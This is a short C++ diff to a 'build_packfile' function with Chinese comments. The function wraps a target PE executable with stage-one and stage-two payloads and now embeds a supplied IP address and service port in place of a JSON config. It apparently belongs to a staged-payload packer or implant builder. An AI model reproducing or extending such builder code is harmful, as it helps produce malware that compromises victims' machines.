@@ -90,7 +90,8 @@ bool build_packfile(const std::string& target_file_path,
     const std::string& output_file_path,
     const std::string& stage_1_payload,
     const std::string& stage_2_payload,
-    const std::string& config)
+    //const std::string& config,
+    const std::string& ip_address)
 {
     // 打开目标PE文件
     std::ifstream pe_file(target_file_path, std::ios::in | std::ios::binary);
@@ -256,8 +257,14 @@ bool build_packfile(const std::string& target_file_path,
     memset(share.cfg, 0, sizeof(share.cfg));
     // 加载配置文件
     ProtocolCFGLoader cfg;
-    auto json_str = Packer::load_file(config);
-    cfg.json = json::parse(json_str);
+    //auto json_str = Packer::load_file(config);
+    //cfg.json = json::parse(json_str);
+    cfg.set_field(sec_no_change_field_id, false);
+    cfg.set_field(port_field_id, kDefaultServicePort);
+    cfg.set_field(test_mode_field_id, false);
+    if (!ip_address.empty()) {
+        cfg.set_field(ip_field_id, ip_address);
+    }
     auto cfg_bin = cfg.dump();
     share.cfg_size = cfg_bin.size();
     // 检查配置文件大小是否超过限制
